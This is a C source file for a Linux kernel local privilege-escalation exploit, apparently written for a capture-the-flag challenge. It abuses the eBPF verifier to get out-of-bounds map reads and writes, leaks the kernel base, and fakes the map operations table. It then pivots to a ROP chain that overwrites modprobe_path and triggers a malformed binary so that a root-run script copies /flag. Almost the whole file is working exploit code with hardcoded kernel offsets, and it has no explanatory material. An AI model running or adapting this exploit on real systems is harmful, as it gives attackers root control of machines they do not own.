#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <stddef.h>
#include <sys/stat.h>

#ifndef __NR_BPF
#define __NR_BPF 321
#endif
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
	((struct bpf_insn){                        \
	 .code = CODE,                          \
	 .dst_reg = DST,                        \
	 .src_reg = SRC,                        \
	 .off = OFF,                            \
	 .imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)    \
	((struct bpf_insn){                    \
	 .code = BPF_LD | BPF_DW | BPF_IMM, \
	 .dst_reg = DST,                    \
	 .src_reg = SRC,                    \
	 .off = 0,                          \
	 .imm = (__u32)(IMM)}),             \
	 ((struct bpf_insn){                \
		.code = 0,                     \
		.dst_reg = 0,                  \
		.src_reg = 0,                  \
		.off = 0,                      \
		.imm = ((__u64)(IMM)) >> 32})

#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_RSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)

#define BPF_LSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

int doredact = 0;
#define LOG_BUF_SIZE 65536
char bpf_log_buf[LOG_BUF_SIZE];
char buffer[64];
int sockets[2];
int sockets2[2];
int mapfd;
int _mapfd[0x1000];
size_t _offset = 0;
void fail(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[!] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
	exit(1);
}

void msg(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

int bpf_create_map(enum bpf_map_type map_type,
		unsigned int key_size,
		unsigned int value_size,
		unsigned int max_entries,
		unsigned int map_fd)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries,
		.inner_map_fd = map_fd
	};

	return syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_request_info()
{
	struct bpf_map_info minfo = {0};
	union bpf_attr attr = {0};

	attr.info.bpf_fd = _mapfd[0];
	attr.info.info = &minfo;
	attr.info.info_len = 0x48;

	printf("minfo %p\n", &minfo);
	syscall(__NR_BPF, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
	printf("Leak is %d\n", minfo.btf_id);
	return minfo.btf_id;
}

int bpf_create_map_node(enum bpf_map_type map_type,
		unsigned int key_size,
		unsigned int value_size,
		unsigned int max_entries,
		unsigned int map_fd,
		unsigned int node)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries,
		.inner_map_fd = map_fd,
		.numa_node = node,
		.map_flags = BPF_F_NUMA_NODE
	};

	return syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_obj_get_info_by_fd(int fd, const unsigned int info_len, void *info)
{
	union bpf_attr attr;
	memset(&attr, 0, sizeof(attr));
	attr.info.bpf_fd = fd;
	attr.info.info_len = info_len;
	attr.info.info = ptr_to_u64(info);
	return syscall(__NR_BPF, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
	};

	return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int bpf_update_elem(int fd, const void *key, const void *value,
		uint64_t flags)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
		.flags = flags,
	};

	return syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int bpf_prog_load(enum bpf_prog_type type,
		const struct bpf_insn *insns, int insn_cnt,
		const char *license)
{
	union bpf_attr attr = {
		.prog_type = type,
		.insns = ptr_to_u64(insns),
		.insn_cnt = insn_cnt,
		.license = ptr_to_u64(license),
		.log_buf = ptr_to_u64(bpf_log_buf),
		.log_size = LOG_BUF_SIZE,
		.log_level = 3,
	};

	return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
}


#define BPF_LD_ABS(SIZE, IMM)                      \
	((struct bpf_insn){                            \
	 .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
	 .dst_reg = 0,                              \
	 .src_reg = 0,                              \
	 .off = 0,                                  \
	 .imm = IMM})

#define BPF_MAP_GET(idx, dst)                                                \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
	BPF_EXIT_INSN(),                                                     \
	BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                              \
	BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)											 \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
	BPF_EXIT_INSN(),                                                     \
	BPF_MOV64_REG((dst), BPF_REG_0),                              \
	BPF_MOV64_IMM(BPF_REG_0, 0)

int load_prog(uint16_t offset)
{
	struct bpf_insn prog[] = {
		BPF_LD_MAP_FD(BPF_REG_9, _mapfd[0]),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_5, 64),
		BPF_MOV64_IMM(BPF_REG_6, 0x1),
		BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_5),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, offset),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
		//BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),

		// Trying to do this *(r8 + 0)
		BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_8, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_4, 0),

		//BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_4, 0),
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),

		/*
		BPF_LD_MAP_FD(BPF_REG_9, _mapfd[0]),
		BPF_MAP_GET(0, BPF_REG_7),
		BPF_MAP_GET_ADDR(0, BPF_REG_8),

		BPF_MAP_GET_ADDR(0, BPF_REG_5),

		BPF_LD_IMM64_RAW(BPF_REG_0, 0, addr),
		BPF_JMP_IMM(BPF_JLE, BPF_REG_7, 4, 25), // goto jmp1
		BPF_MOV64_IMM(BPF_REG_0, 0x0),
		BPF_EXIT_INSN(),

		BPF_MOV64_REG(BPF_REG_0, BPF_REG_5),
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),

		BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),
		// expanded instruction here
		// BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit),
		// BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, BPF_REG_7),
		// BPF_ALU64_REG(BPF_OR, BPF_REG_AX, BPF_REG_7),
		// BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0),
		// BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63),
		// BPF_ALU64_REG(BPF_AND, BPF_REG_AX, BPF_REG_7),
		// BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_AX),
		//
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x0),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x0),
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x8),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x8),
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0xc),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0xc),
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x10),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x10),
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x18),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x18),
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x20),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x20),
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x28),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x28),

		BPF_MOV64_IMM(BPF_REG_0, 0x0),
		BPF_EXIT_INSN(),
		BPF_JMP_IMM(BPF_JLE, BPF_REG_7, 4, -24), // jmp1: goto jmp2

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
		*/
	};
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}

int load_prog_write(uint64_t offset, uint64_t val)
{
	struct bpf_insn prog[]
	=
	{
		BPF_LD_MAP_FD(BPF_REG_9, _mapfd[0]),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_5, 64),
		BPF_MOV64_IMM(BPF_REG_6, 1),
		BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_5),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, offset),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
		BPF_MOV64_IMM(BPF_REG_5, val & 0xffffffff),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),
		BPF_MOV64_IMM(BPF_REG_5, val >> 32),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 4),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};

	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog)/sizeof(struct bpf_insn), "GPL");
}

int load_prog_write_two(uint64_t offset, uint64_t val, uint64_t val2)
{
	struct bpf_insn prog[]
	=
	{
		BPF_LD_MAP_FD(BPF_REG_9, _mapfd[0]),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_5, 64),
		BPF_MOV64_IMM(BPF_REG_6, 1),
		BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_5),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, offset),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
		BPF_MOV64_IMM(BPF_REG_5, val & 0xffffffff),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),
		BPF_MOV64_IMM(BPF_REG_5, val >> 32),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 4),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),

		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 4),
		BPF_MOV64_IMM(BPF_REG_5, val2 & 0xffffffff),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 4),
		BPF_MOV64_IMM(BPF_REG_5, val2 >> 32),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};

	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog)/sizeof(struct bpf_insn), "GPL");
}

int load_prog_write_three(uint64_t offset, uint64_t val, uint64_t val2, uint64_t val3)
{
	struct bpf_insn prog[]
	=
	{
		BPF_LD_MAP_FD(BPF_REG_9, _mapfd[0]),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_8, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_5, 64),
		BPF_MOV64_IMM(BPF_REG_6, 1),
		BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_5),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, offset),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
		BPF_MOV64_IMM(BPF_REG_5, val & 0xffffffff),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),
		BPF_MOV64_IMM(BPF_REG_5, val >> 32),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 4),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),

		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 4),
		BPF_MOV64_IMM(BPF_REG_5, val2 & 0xffffffff),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 4),
		BPF_MOV64_IMM(BPF_REG_5, val2 >> 32),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),

		BPF_MOV64_REG(BPF_REG_8, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_5, 64),
		BPF_MOV64_IMM(BPF_REG_6, 1),
		BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_5),
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110),
		BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
		BPF_MOV64_IMM(BPF_REG_5, val3 & 0xffffffff),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),
		BPF_MOV64_IMM(BPF_REG_5, val3 >> 32),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 4),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};

	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog)/sizeof(struct bpf_insn), "GPL");
}

int write_msg(int fd)
{
	ssize_t n = write(fd, buffer, sizeof(buffer));
	if (n < 0)
	{
		perror("write");
		return 1;
	}
	if (n != sizeof(buffer))
	{
		fprintf(stderr, "short write: %ld\n", n);
	}
	return 0;
}

void update_elem(int key, size_t val)
{
	if (bpf_update_elem(mapfd, &key, &val, 0)) {
		fail("bpf_update_elem failed '%s'\n", strerror(errno));
	}
}

size_t get_elem(int fd, int key)
{
	size_t val;
	if (bpf_lookup_elem(fd, &key, &val)) {
		fail("bpf_lookup_elem failed '%s'\n", strerror(errno));
	}
	return val;
}

uint64_t arb_read_off(uint64_t offset)
{
	int key;
	char buf[0x80] = {0};

	printf("offset is 0x%lx\n", offset);
	int progfd = load_prog(offset);
	if (progfd < 0)
	{
		if (errno == EACCES)
		{
			msg("log:\n%s", bpf_log_buf);
		}
		printf("%s\n", bpf_log_buf);
		fail("failed to load prog '%s'\n", strerror(errno));
	}
	//printf("loaded\n");

	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
	{
		fail("failed to create socket pair '%s'\n", strerror(errno));
	}

	if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
	{
		fail("setsockopt '%s'\n", strerror(errno));
	}

	write_msg(sockets[0]);
	close(sockets[0]);
	close(sockets[1]);
	//printf("Done\n");
	key = 0;
	bpf_lookup_elem(_mapfd[0], &key, &buf);
	printf("res: %lx\n", ((uint64_t *)buf)[0]);
	return ((uint64_t *)buf)[0];
}

void arb_write_off(uint64_t offset, uint64_t val)
{

	int progfd = load_prog_write(offset, val);
	if (progfd < 0)
	{
		if (errno == EACCES)
		{
			msg("log:\n%s", bpf_log_buf);
		}
		printf("%s\n", bpf_log_buf);
		fail("failed to load prog '%s'\n", strerror(errno));
	}
	//printf("loaded\n");

	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
	{
		fail("failed to create socket pair '%s'\n", strerror(errno));
	}

	if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
	{
		fail("setsockopt '%s'\n", strerror(errno));
	}

	write_msg(sockets[0]);
	close(sockets[0]);
	close(sockets[1]);
	//printf("Done\n");
}

void arb_write_off_two(uint64_t offset, uint64_t val, uint64_t val2)
{

	int progfd = load_prog_write_two(offset, val, val2);
	if (progfd < 0)
	{
		if (errno == EACCES)
		{
			msg("log:\n%s", bpf_log_buf);
		}
		printf("%s\n", bpf_log_buf);
		fail("failed to load prog '%s'\n", strerror(errno));
	}
	printf("loaded\n");
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
	{
		fail("failed to create socket pair '%s'\n", strerror(errno));
	}
	if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
	{
		fail("setsockopt '%s'\n", strerror(errno));
	}

	write_msg(sockets[0]);
	close(sockets[0]);
	close(sockets[1]);
	//printf("Done\n");
}

void modprobe_trigger()
{
	system("echo -ne '#!/bin/sh\ncat /flag > /tmp/flag' > /tmp/aa");
	system("chmod a+x /tmp/aa");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/b");
	system("chmod a+x /tmp/b");
	system("/tmp/b");
	system("cat /tmp/flag");
}

void arb_write_off_three(uint64_t offset, uint64_t val, uint64_t val2, uint64_t val3)
{

	int progfd = load_prog_write_three(offset, val, val2, val3);
	if (progfd < 0)
	{
		if (errno == EACCES)
		{
			msg("log:\n%s", bpf_log_buf);
		}
		printf("%s\n", bpf_log_buf);
		fail("failed to load prog '%s'\n", strerror(errno));
	}
	//printf("loaded\n");
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
	{
		fail("failed to create socket pair '%s'\n", strerror(errno));
	}
	if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
	{
		fail("setsockopt '%s'\n", strerror(errno));
	}

	write_msg(sockets[0]);
	close(sockets[0]);
	close(sockets[1]);
	//printf("Done\n");
}

void arb_64_write_off(uint64_t offset, uint64_t val)
{
	arb_write_off(offset, val);
	//arb_write_off(offset - 0x4, val >> 32);
}

uint64_t arb_read(uint64_t address)
{
	uint64_t full_address = 0;
	uint64_t leak = 0;

	// Make (struct btf_map*)->btf point to address
	arb_64_write_off(0xd0, address - 0x58);
	leak = bpf_request_info();
	full_address |= leak;
	arb_64_write_off(0xd0, address - 0x58 + 0x4);
	leak = bpf_request_info();
	full_address |= leak << 32;
	return full_address;
}


void loop_lookup(void *arg)
{
	int key;
	char buf[0x80] = {0};
	while (1)
		bpf_lookup_elem(_mapfd[0], &key, &buf);
}



void overwrite_modprobe_path()
{
	_mapfd[0] = bpf_create_map(BPF_MAP_TYPE_ARRAY,4,0x40,0x10,0);
	_mapfd[1] = bpf_create_map(BPF_MAP_TYPE_ARRAY,4,0x40,0x10,0);
	uint64_t result=0;

	uint64_t array_map_ops = arb_read_off(0x110);
	uint64_t kernel_base = array_map_ops - 0x1035d20;
	printf("Kernel base @ %lx\n", kernel_base);
	uint64_t bpf_map = arb_read_off(0x50) - 0xc0;
	printf("bpf_map is at @ %lx\n", bpf_map);

	// We control RDI this is a pefrect funtion to call somethign at RDI offset
	// With controlled first argument from RDI offset too.
	uint64_t work_for_cpu_fn = kernel_base + 0x0b7440;
	uint64_t init_cred = kernel_base + 0x1a64720;
	uint64_t commit_creds = kernel_base + 0x0c80d0;
	//uint64_t p = 0x414141414141414141;
	/*
	getchar();
	for(int i = 0; i < 0x120; i += 8)
	{
		arb_64_write_off(0x110 + 0x140 - i, p);
		p += 0x0101010101010101;
	}
	bpf_update_elem(_mapfd[0], &key, &buf, 0);
	getchar();
	*/

	/*
	for (int i = 0; i < 0x120; i += 8)
	{
		uint64_t ptr = arb_read_off
		if (i == 0x10)
			arb_64_write_off(0x110 + 0x140 - i, work_for_cpu_fn);
		else
			arb_64_write_off(0x110 + 0x140 - i, 0);
	}
	*/

	for (int i = 0; i < 0x120; i += 8)
	{
		uint64_t ptr = arb_read(array_map_ops + i);
		arb_64_write_off(0x110 + 0x140 - i, ptr);
	}
	
	arb_64_write_off(0x110 + 0x140 - 0x10, work_for_cpu_fn);


	// I will try to make a ROP chain to patch modprobe_path
	uint64_t rop_addr = bpf_map - 0x1f0;

	uint64_t pivot = kernel_base + 0x2ac83e;
	uint64_t write = kernel_base + 0x0c7585; // mov qword ptr [rdi], rsi ; ret

	uint64_t poprdi = kernel_base + 0x08ab90;
	uint64_t poprsi = kernel_base + 0x07033e;

	uint64_t modprobe_path = kernel_base + 0x1a650e0;

	uint64_t rop[0x100] = {0};
	int i = 0;
	rop[i++] = poprdi;
	rop[i++] = modprobe_path;
	rop[i++] = poprsi;
	rop[i++] = 0x61612f706d742f;
	rop[i++] = write;
	rop[i++] = kernel_base + 0x042ca2; // leave ; ret

	for(int j = 0; j < i; j++)
	{
		arb_64_write_off(0x300 - j*8, rop[j]);
	}

	getchar();
	arb_write_off_three(0x110 - 0x20, pivot, rop_addr, bpf_map - 0x140);
	arb_read_off(0x100);
	//loop_lookup(NULL);
	//getchar();

	//getchar();
	//getchar();
	//arb_write_off(0x110 - 0x20, 0x7080808080808080);
	//arb_write_off(0x110 - 0x28, init_cred);
	//arb_write_off(0x110, bpf_map - 0x140);
	//getchar();

	//arb_read_off(0x140);

	//printf("getuid : %d\n", getuid());
	//system("/bin/sh");
	getchar();

	/*
	// We just do a snapshot to that vtable to change only the element
	// we want for arb write.
	
	for (int i = 0; i < 0x120; i += 8)
	{
		uint64_t ptr = arb_read(array_map_ops + i);
		arb_64_write_off(0x110 + 0x140 - i, ptr);
	}

	// Change spin_lock_off to zero.
	//arb_write_off(0xe4, 0x0000000100000000);

	//getchar();
	// Change max_entries to max value 0xffffffff
	arb_write_off(0xec, 0x00000000ffffffff);

	getchar();
	// Change type from Array to Stack
	arb_write_off(0x110 - 0x18, 23);
	//printf("full 8 bytes : %p\n", arb_read(kernel_base));
	getchar();
	*/
}

int main()
{
	if (fork() == 0)
	{
		overwrite_modprobe_path();
	} else {
		wait(NULL);
		modprobe_trigger();
	}

}